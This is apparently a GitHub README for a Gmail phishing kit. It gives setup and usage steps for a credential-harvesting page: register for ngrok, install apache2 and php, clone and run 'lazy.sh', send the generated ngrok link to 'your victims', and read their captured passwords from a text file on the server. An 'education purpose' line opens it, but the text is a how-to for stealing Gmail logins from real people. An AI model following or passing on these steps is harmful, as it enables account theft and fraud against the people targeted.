# Gmail-phishing
this is education purpose and testing script at 2018.

requirements:

ngrok acc auth token {

  https://dashboard.ngrok.com/signup 
  
  https://dashboard.ngrok.com/get-started 
  
  save authtoken at step 3.
}

apache2

php


usage :

git clone https://github.com/Mr219/Gmail-phishing.git 

cd Gmail-phishing

chmod +x lazy.sh

./lazy.sh

you will get ngrok subdomain from terminal.

send "ngroksubdomain/gmail" to your victims.

you can see victims pass from another terminal tab with "cat /var/www/html/gmail/msf-lazy.txt".

don't change file permission.

Thanks ,

Lazy Phishers
